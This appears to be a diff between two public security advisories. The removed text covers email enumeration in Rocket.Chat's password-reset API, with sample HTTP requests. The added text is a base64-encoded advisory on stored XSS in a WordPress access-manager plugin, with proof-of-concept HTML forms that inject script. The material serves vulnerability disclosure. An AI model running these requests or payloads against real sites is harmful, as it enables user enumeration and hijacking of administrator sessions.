+X3NxbF9pbmplY3Rpb25fdnVsbmVyYWJpbGl0aWVzX2luX2Zvcm1idWlsZGVy
+X3dvcmRwcmVzc19wbHVnaW4uaHRtbA0KWzJdIGh0dHBzOi8vd29yZHByZXNz
+Lm9yZy9wbHVnaW5zL2Zvcm1idWlsZGVyLw0KWzNdIGh0dHBzOi8vZG93bmxv
+YWRzLndvcmRwcmVzcy5vcmcvcGx1Z2luL2Zvcm1idWlsZGVyLjEuMDguemlw
 
-Overview
-########
+--------------6C6527F16AA998F581C836CD
+Content-Type: text/plain; charset=UTF-8;
+ name="persistent_cross_site_scripting_vulnerability_in_user_access_manager_wordpress_plugin.txt"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+ filename*0="persistent_cross_site_scripting_vulnerability_in_user_access";
+ filename*1="_manager_wordpress_plugin.txt"
 
-Advisory ID: TRSA-2010-01
-Advisory version: 1.0
-Advisory status: Public
-Advisory URL: https://trovent.io/security-advisory-2010-01
-Affected product: Web application Rocket.Chat
-Affected version: <=3D 3.7.1
-Vendor: Rocket.Chat Technologies Corp., https://rocket.chat
-Credits: Trovent Security GmbH, Nick Decker, Stefan Pietsch
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpQZXJzaXN0ZW50IENyb3Nz
+LVNpdGUgU2NyaXB0aW5nIHZ1bG5lcmFiaWxpdHkgaW4gVXNlciBBY2Nlc3Mg
+TWFuYWdlcg0KV29yZFByZXNzIFBsdWdpbg0KLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tDQpCdXJhayBLZWxlYmVrLCBKdWx5IDIwMTYNCg0KLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpBYnN0cmFjdA0KLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tDQpBIHBlcnNpc3RlbnQgQ3Jvc3MtU2l0ZSBTY3Jp
+cHRpbmcgdnVsbmVyYWJpbGl0eSBoYXMgYmVlbiBlbmNvdW50ZXJlZCBpbg0K
+dGhlIFVzZXIgQWNjZXNzIE1hbmFnZXIgV29yZFByZXNzIFBsdWdpbi4gVGhp
+cyBpc3N1ZSBhbGxvd3MgYW4gYXR0YWNrZXINCnRvIHBlcmZvcm0gYSB3aWRl
+IHZhcmlldHkgb2YgYWN0aW9ucywgc3VjaCBhcyBzdGVhbGluZyBBZG1pbmlz
+dHJhdG9ycycNCnNlc3Npb24gdG9rZW5zLCBvciBwZXJmb3JtaW5nIGFyYml0
+cmFyeSBhY3Rpb25zIG9uIHRoZWlyIGJlaGFsZi4gSW4NCm9yZGVyIHRvIGV4
+cGxvaXQgdGhpcyBpc3N1ZSwgdGhlIGF0dGFja2VyIGhhcyB0byBsdXJlL2Zv
+cmNlIGEgbG9nZ2VkIG9uDQpXb3JkUHJlc3MgQWRtaW5pc3RyYXRvciBpbnRv
+IG9wZW5pbmcgYSBtYWxpY2lvdXMgd2Vic2l0ZS4NCg0KLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tDQpPVkUgSUQNCi0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLQ0KT1ZFLTIwMTYwNzEyLTAwMjUNCg0KLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tDQpUZXN0ZWQgdmVyc2lvbnMNCi0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLQ0KVGhpcyBpc3N1ZSB3YXMgc3VjY2Vzc2Z1bGx5IHRl
+c3RlZCBvbiB0aGUgVXNlciBBY2Nlc3MgTWFuYWdlciBbMl0NCldvcmRQcmVz
+cyBQbHVnaW4gdmVyc2lvbiAxLjIuNi43Lg0KDQotLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0NCkZpeA0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+DQpUaGlzIGlzc3VlIGlzIHJlc29sdmVkIGluIFVzZXIgQWNjZXNzIE1hbmFn
+ZXIgdmVyc2lvbiAxLjIuMTQgWzNdLg0KDQotLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0NCkludHJvZHVjdGlvbg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tDQpXaXRoIHRoZSBVc2VyIEFjY2VzcyBNYW5hZ2VyIFdvcmRQcmVz
+cyBwbHVnaW4gaXQgaXMgcG9zc2libGUgdG8gbWFuYWdlDQphY2Nlc3MgdG8g
+cG9zdHMsIHBhZ2VzIGFuZCBmaWxlcy4gVGhpcyBwbHVnaW4gaXMgdXNlZnVs
+IGlmIHlvdSBuZWVkIGENCm1lbWJlciBhcmVhIG9yIGEgcHJpdmF0ZSBzZWN0
+aW9uIGF0IHlvdXIgYmxvZyBvciB5b3Ugd2FudCB0aGF0IG90aGVyDQpwZW9w
+bGUgY2FuIHdyaXRlIGF0IHlvdXIgYmxvZyBidXQgbm90IGV2ZXJ5d2hlcmUu
+DQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KRGV0YWlscw0KLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpQZXJzaXN0ZW50IENyb3NzLVNp
+dGUgU2NyaXB0aW5nIHdhcyBmb3VuZCBpbiBhZG1pbiBwYW5lbCAnbWFuYWdl
+JyBwYWdlDQpvZiBVc2VyIEFjY2VzcyBNYW5hZ2VyLiBNdWx0aXBsZSBwYXJh
+bWV0ZXJzIGluIFBPU1QgdWFtX3VzZXJncm91cCBhcmUNCmFmZmVjdGVkIGR1
+ZSB0byBpbnN1ZmZpY2llbnQgb3V0cHV0IGVuY29kaW5nLiBUaGlzIGlzc3Vl
+IGFsbG93cyBhbg0KYXR0YWNrZXIgdG8gcGVyZm9ybSBhIHdpZGUgdmFyaWV0
+eSBvZiBhY3Rpb25zLCBzdWNoIGFzIHN0ZWFsaW5nDQpBZG1pbmlzdHJhdG9y
+cycgc2Vzc2lvbiB0b2tlbnMsIG9yIHBlcmZvcm1pbmcgYXJiaXRyYXJ5IGFj
+dGlvbnMgb24gdGhlaXINCmJlaGFsZi4gSW4gb3JkZXIgdG8gZXhwbG9pdCB0
+aGlzIGlzc3VlLCB0aGUgYXR0YWNrZXIgaGFzIHRvIGx1cmUvZm9yY2UgYQ0K
+bG9nZ2VkIG9uIFdvcmRQcmVzcyBBZG1pbmlzdHJhdG9yIGludG8gb3Blbmlu
+ZyBhIG1hbGljaW91cyB3ZWJzaXRlLg0KCQ0KLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tDQpQcm9vZiBvZiBjb25jZXB0DQotLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0NCjxodG1sPg0KCTxib2R5Pg0KCQk8Zm9ybSBhY3Rpb249
+Imh0dHA6Ly88dGFyZ2V0Pi93cC1hZG1pbi9hZG1pbi5waHA/cGFnZT11YW1f
+dXNlcmdyb3VwIg0KbWV0aG9kPSJQT1NUIj4NCgkJCTxpbnB1dCB0eXBlPSJo
+aWRkZW4iIG5hbWU9InVhbUluc2VydFVwZGF0ZUdyb3VwTm9uY2UiDQp2YWx1
+ZT0iODY1N2JkMjQyNCIgLz4NCgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5h
+bWU9Il93cF9odHRwX3JlZmVyZXIiDQp2YWx1ZT0iL3dwLWFkbWluL2FkbWlu
+LnBocD9wYWdlPXVhbV91c2VyZ3JvdXAiIC8+DQoJCQk8aW5wdXQgdHlwZT0i
+aGlkZGVuIiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJhZGRHcm91cCIgLz4NCgkJ
+CTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InVzZXJHcm91cE5hbWUiDQp2
+YWx1ZT0iYXM8c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+IiAvPg0KCQkJPGlu
+cHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlckdyb3VwRGVzY3JpcHRpb24i
+IHZhbHVlPSJhc2QiIC8+DQoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1l
+PSJpcFJhbmdlIiB2YWx1ZT0iYXNkIiAvPg0KCQkJPGlucHV0IHR5cGU9Imhp
+ZGRlbiIgbmFtZT0icmVhZEFjY2VzcyIgdmFsdWU9Imdyb3VwIiAvPg0KCQkJ
+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0id3JpdGVBY2Nlc3MiIHZhbHVl
+PSJncm91cCIgLz4NCgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InN1
+Ym1pdCIgdmFsdWU9IkFkZCB1c2VyIGdyb3VwIiAvPg0KCQkJPGlucHV0IHR5
+cGU9ImhpZGRlbiIgbmFtZT0iIiB2YWx1ZT0iIiAvPg0KCQkJPGlucHV0IHR5
+cGU9InN1Ym1pdCIgdmFsdWU9IlN1Ym1pdCIgLz4NCgkJPC9mb3JtPg0KCTwv
+Ym9keT4NCjwvaHRtbD4NCg0KDQo8aHRtbD4NCgk8Ym9keT4NCgkJPGZvcm0g
+YWN0aW9uPSJodHRwOi8vPHRhcmdldD4vd3AtYWRtaW4vYWRtaW4ucGhwP3Bh
+Z2U9dWFtX3VzZXJncm91cCINCm1ldGhvZD0iUE9TVCI+DQoJCQk8aW5wdXQg
+dHlwZT0iaGlkZGVuIiBuYW1lPSJ1YW1JbnNlcnRVcGRhdGVHcm91cE5vbmNl
+Ig0KdmFsdWU9Ijg2NTdiZDI0MjQiIC8+DQoJCQk8aW5wdXQgdHlwZT0iaGlk
+ZGVuIiBuYW1lPSJfd3BfaHR0cF9yZWZlcmVyIg0KdmFsdWU9Ii93cC1hZG1p
+bi9hZG1pbi5waHA/cGFnZT11YW1fdXNlcmdyb3VwIiAvPg0KCQkJPGlucHV0
+IHR5cGU9ImhpZGRlbiIgbmFtZT0iYWN0aW9uIiB2YWx1ZT0iYWRkR3JvdXAi
+IC8+DQoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ1c2VyR3JvdXBO
+YW1lIiB2YWx1ZT0ic2FkIiAvPg0KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIg
+bmFtZT0idXNlckdyb3VwRGVzY3JpcHRpb24iDQp2YWx1ZT0iPHNjcmlwdD5h
+bGVydCgyKTwvc2NyaXB0PiIgLz4NCgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4i
+IG5hbWU9ImlwUmFuZ2UiIHZhbHVlPSJhc2QiIC8+DQoJCQk8aW5wdXQgdHlw
+ZT0iaGlkZGVuIiBuYW1lPSJyZWFkQWNjZXNzIiB2YWx1ZT0iZ3JvdXAiIC8+
+DQoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ3cml0ZUFjY2VzcyIg
+dmFsdWU9Imdyb3VwIiAvPg0KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFt
+ZT0ic3VibWl0IiB2YWx1ZT0iQWRkIHVzZXIgZ3JvdXAiIC8+DQoJCQk8aW5w
+dXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU3VibWl0IiAvPg0KCQk8L2Zvcm0+
+DQoJPC9ib2R5Pg0KPC9odG1sPg0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0NClJlZmVyZW5jZXMNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LQ0KWzFdDQpodHRwczovL3N1bW9mcHduLm5sL2Fkdmlzb3J5LzIwMTYvcGVy
+c2lzdGVudF9jcm9zc19zaXRlX3NjcmlwdGluZ192dWxuZXJhYmlsaXR5X2lu
+X3VzZXJfYWNjZXNzX21hbmFnZXJfd29yZHByZXNzX3BsdWdpbi5odG1sDQpb
+Ml0gaHR0cHM6Ly93b3JkcHJlc3Mub3JnL3BsdWdpbnMvdXNlci1hY2Nlc3Mt
+bWFuYWdlci8NClszXQ0KaHR0cHM6Ly9kb3dubG9hZHMud29yZHByZXNzLm9y
+Zy9wbHVnaW4vdXNlci1hY2Nlc3MtbWFuYWdlci4xLjIuMTQuemlw
 
-
-Detailed description
-####################
-
-Trovent Security GmbH discovered an email address enumeration vulnerability
-in the password reset function of the chat application Rocket.Chat. This vu=
-lnerability lets
-an unauthorized user enumerate registered email addresses on the instance o=
-f Rocket.Chat.
-
-Severity: Medium
-CVSS Score: 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
-CVE ID: CVE-2020-28208
-CWE ID: CWE-204
-
-
-Proof of concept
-################
-
-Sample HTTP request sent with a registered email address:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
-Host: localhost:3000
-Content-Length: 122
-Accept: */*
-Content-Type: application/json
-
-
-{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"pa=
-rams\":[\"positive@test.de\"],\"id\":\"3\"}"}
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-
-The server response to a valid email address:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-HTTP/1.1 200 OK
-X-XSS-Protection: 1
-X-Content-Type-Options: nosniff
-X-Frame-Options: sameorigin
-X-Instance-ID: DQDfuEfNLdbZr3zYH
-Cache-Control: no-store
-Pragma: no-cache
-content-type: application/json
-Vary: Accept-Encoding
-Date: Tue, 03 Nov 2020 12:01:25 GMT
-Connection: keep-alive
-Content-Length: 78
-
-{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":true}","success":tr=
-ue}
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-
-Sample HTTP request sent with a non registered email address:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
-Host: localhost:3000
-Content-Length: 119
-Accept: */*
-Content-Type: application/json
-
-
-{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"pa=
-rams\":[\"false@test.de\"],\"id\":\"3\"}"}
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-
-The server response to an invalid email address:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-HTTP/1.1 200 OK
-X-XSS-Protection: 1
-X-Content-Type-Options: nosniff
-X-Frame-Options: sameorigin
-X-Instance-ID: DQDfuEfNLdbZr3zYH
-Cache-Control: no-store
-Pragma: no-cache
-content-type: application/json
-Vary: Accept-Encoding
-Date: Tue, 03 Nov 2020 12:03:08 GMT
-Connection: keep-alive
-Content-Length: 79
-
-{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":false}","success":t=
-rue}
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-
-
-Solution / Workaround
-#####################
-
-Ensure the application returns consistent generic server responses independ=
-ent
-of the email address entered during the password reset process.
-
-
-History
-#######
-
-2020-10-27: Vulnerability found
-2020-11-03: Advisory created and CVE ID requested
-2020-11-06: Vendor contacted and informed about planned disclosure date
-2020-11-06: Vendor confirmed vulnerability, working on a fix
-2021-01-07: Advisory published
-
------------------------3a030728afa836a510b570f792727d48--
-
------------------------a0045f27396069c44aafdec01bdd7c1d
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: OpenPGP digital signature
-Content-Disposition: attachment; filename="signature.asc"
-
------BEGIN PGP SIGNATURE-----
-Version: ProtonMail
-
-wsFzBAEBCAAGBQJf9zqhACEJEM8er/4ehY63FiEE0wArIZvu5AKY9ZSXzx6v
-/h6FjrfDDRAAiXLFgqps4pe5GSJ01xfIJ2AL/UxfQnDbef97Qhsm61Q94g5z
-+pVZTnAXKT5+P6OS9rRj6i8H+GuoiFj/xX+DA0HKYxzoOOi0WlLfFhd1Xddm
-F2lEJvdZ6i1Hdw3+ZzSoPMxK+WvKlQFOfdngGnfe6uOb1dRcXHug8rjKHxpm
-LDYu3WUes3REk2ue8qeVpigso0YRyHwJMC9GyGG2AgAGXIlgOXwuRuOAZYo/
-2aHreh3MNHhGu3Rrklx1FMkEAhaPb1u6wiWi+EpsbQzJSQxtM3wcSzAvXJ7c
-+NbQW/QW9YYJWfXvH2Wy2qsebwNuhzPYepimdwcArDfxRCd8LzrlypoUGq90
-K5I7YdJZ5p75FvteKzPbwxEpw50ArT7E8KQPkrCabFd29YXSB3CB/EHd645d
-9ah5mZS5fO2Q3PCRiVqAFs3mNb20OHbrJxBgLyB3ig7Nirbbw6K8I96DrTDM
-xxaqAMVnFf50XQW4JDqjmhlxjSV0UvI4Pn7ykUhmWkh/5DAOp7SV6BEQGPpX
-htTcBxiKgUuV0JscxS8Y4DXmtKLQnzUyiragOVMXq+Y/z6Bqfcrb6Hrn0WcZ
-5PWtj0+BuyfOKkA1kEcsyUUqcxIU+R4gA0ubpko/ssnzn076GJ2LsOgmSVE9
-wa1kEQ2FrI/3PSlVzsvmUurYO9kZfzUWJTw=
-=jOqN
------END PGP SIGNATURE-----
-
-
------------------------a0045f27396069c44aafdec01bdd7c1d--
-
+--------------6C6527F16AA998F581C836CD--
